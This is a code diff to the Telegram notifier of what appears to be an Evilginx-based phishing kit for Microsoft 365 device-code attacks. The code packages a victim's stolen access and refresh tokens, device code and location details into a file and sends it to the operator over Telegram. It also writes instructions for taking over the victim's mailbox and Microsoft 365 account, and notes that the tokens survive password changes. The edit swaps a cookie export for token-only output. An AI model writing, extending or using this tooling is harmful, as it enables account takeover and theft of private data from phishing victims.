@@ -1081,7 +1081,7 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 			provider = data.Phishlet
 		}
 
-		// Build caption for the file
+		// Build caption for the Telegram message
 		caption := "🎯 DEVICE CODE CAPTURED!\n"
 		caption += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
 		caption += fmt.Sprintf("👤 User: %s\n", userName)
@@ -1092,18 +1092,9 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		caption += fmt.Sprintf("📍 Location: %s, %s %s\n", geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
 		caption += fmt.Sprintf("🏢 ISP: %s\n", geoInfo.ISP)
 		caption += fmt.Sprintf("⏰ Time: %s\n", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))
+		caption += "✅ Tokens attached as file"
 
-		// Count cookies
-		cookieCount := 0
-		if dc_cookies, ok := data.Custom["dc_cookies"]; ok && dc_cookies != "" {
-			var tmpCookies []interface{}
-			json.Unmarshal([]byte(dc_cookies), &tmpCookies)
-			cookieCount = len(tmpCookies)
-		}
-		caption += fmt.Sprintf("🍪 Cookies: %d extracted\n", cookieCount)
-		caption += "✅ Import cookies with Cookie Editor extension"
-
-		// Build the .txt file content with cookies + tokens
+		// Build the .txt file content with tokens only
 		var fileContent strings.Builder
 
 		fileContent.WriteString("═══════════════════════════════════════════════════\n")
@@ -1111,30 +1102,7 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		fileContent.WriteString("  " + time.Now().UTC().Format("2006-01-02 15:04:05 UTC") + "\n")
 		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
 
-		// Section 1: Cookie Editor format cookies (JSON array)
-		fileContent.WriteString("═══════════════════════════════════════════════════\n")
-		fileContent.WriteString("  COOKIES - Cookie Editor Import Format\n")
-		fileContent.WriteString("  (Copy everything between START and END markers)\n")
-		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
-		fileContent.WriteString("--- COOKIE EDITOR JSON START ---\n")
-
-		if dc_cookies, ok := data.Custom["dc_cookies"]; ok && dc_cookies != "" {
-			// The cookies are already in Cookie Editor compatible format from token_portal.go
-			// Re-format with indentation for readability
-			var rawCookies []json.RawMessage
-			if err := json.Unmarshal([]byte(dc_cookies), &rawCookies); err == nil {
-				prettyJSON, _ := json.MarshalIndent(rawCookies, "", "  ")
-				fileContent.Write(prettyJSON)
-			} else {
-				fileContent.WriteString(dc_cookies)
-			}
-		} else {
-			fileContent.WriteString("[]")
-		}
-
-		fileContent.WriteString("\n--- COOKIE EDITOR JSON END ---\n\n")
-
-		// Section 2: Tokens
+		// Section 1: Access Token
 		fileContent.WriteString("═══════════════════════════════════════════════════\n")
 		fileContent.WriteString("  ACCESS TOKEN\n")
 		fileContent.WriteString("  Valid: ~1 hour | Server auto-refreshes every 15 min\n")
@@ -1144,6 +1112,7 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		}
 		fileContent.WriteString("\n\n")
 
+		// Section 2: Refresh Token
 		fileContent.WriteString("═══════════════════════════════════════════════════\n")
 		fileContent.WriteString("  REFRESH TOKEN\n")
 		fileContent.WriteString("  Valid: 90 days | Survives password changes\n")
@@ -1154,40 +1123,34 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		}
 		fileContent.WriteString("\n\n")
 
-		// Section 3: FOCI tokens if available
-		if fociJSON, ok := data.Custom["dc_foci_tokens"]; ok && fociJSON != "" {
-			fileContent.WriteString("═══════════════════════════════════════════════════\n")
-			fileContent.WriteString("  FOCI SERVICE TOKENS\n")
-			fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
-			var fociTokens map[string]string
-			if err := json.Unmarshal([]byte(fociJSON), &fociTokens); err == nil {
-				for svcName, svcToken := range fociTokens {
-					fileContent.WriteString("--- " + svcName + " ---\n")
-					fileContent.WriteString(svcToken + "\n\n")
-				}
-			}
+		// Section 3: Device Code + Copy Link
+		fileContent.WriteString("═══════════════════════════════════════════════════\n")
+		fileContent.WriteString("  DEVICE CODE & LINK\n")
+		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
+		if dc, ok := data.Custom["dc_user_code"]; ok && dc != "" {
+			fileContent.WriteString("Device Code: " + dc + "\n")
 		}
+		if link, ok := data.Custom["dc_link"]; ok && link != "" {
+			fileContent.WriteString("Auth Link: " + link + "\n")
+		}
+		fileContent.WriteString("\n")
 
 		// Section 4: Instructions
 		fileContent.WriteString("═══════════════════════════════════════════════════\n")
 		fileContent.WriteString("  HOW TO USE\n")
 		fileContent.WriteString("═══════════════════════════════════════════════════\n\n")
-		fileContent.WriteString("METHOD 1 - Cookie Import (Full Browser Access):\n")
-		fileContent.WriteString("1. Install 'Cookie Editor' extension in Chrome/Edge\n")
-		fileContent.WriteString("2. Go to https://login.microsoftonline.com\n")
-		fileContent.WriteString("3. Click Cookie Editor icon → Import\n")
-		fileContent.WriteString("4. Copy ONLY the JSON between START/END markers above\n")
-		fileContent.WriteString("5. Paste and click Import\n")
-		fileContent.WriteString("6. Refresh the page → signed in as " + userEmail + "\n")
-		fileContent.WriteString("7. Navigate to outlook.office365.com, onedrive.live.com, etc.\n\n")
-		fileContent.WriteString("METHOD 2 - Mailbox Viewer:\n")
+		fileContent.WriteString("METHOD 1 - Mailbox Viewer:\n")
 		fileContent.WriteString("1. Open mailbox.html in browser\n")
 		fileContent.WriteString("2. Paste the ACCESS TOKEN above\n")
 		fileContent.WriteString("3. Full mailbox access immediately\n\n")
+		fileContent.WriteString("METHOD 2 - Token Portal:\n")
+		fileContent.WriteString("1. Run 'sessions <id> portal' in evilginx terminal\n")
+		fileContent.WriteString("2. Open generated URL in browser\n")
+		fileContent.WriteString("3. Full Microsoft 365 access via cookie import\n\n")
 		fileContent.WriteString("NOTES:\n")
-		fileContent.WriteString("• Cookies survive password changes\n")
-		fileContent.WriteString("• Server auto-refreshes tokens every 15 minutes\n")
 		fileContent.WriteString("• Refresh token valid for 90 days\n")
+		fileContent.WriteString("• Server auto-refreshes tokens every 15 minutes\n")
+		fileContent.WriteString("• Tokens survive password changes\n")
 
 		// Determine filename
 		usernameFile := "session"
@@ -1199,7 +1162,7 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 				return '_'
 			}, userEmail)
 		}
-		filename := fmt.Sprintf("%s_cookies_tokens.txt", usernameFile)
+		filename := fmt.Sprintf("%s_tokens.txt", usernameFile)
 
 		// Send as file via Telegram sendDocument
 		var body bytes.Buffer
@@ -1225,7 +1188,7 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		}
 		resp.Body.Close()
 
-		log.Success("[telegram] Cookies+tokens file sent for %s (%d cookies)", userEmail, cookieCount)
+		log.Success("[telegram] Token file sent for %s", userEmail)
 		return nil
 
 	case EventDeviceCodeGenerated:
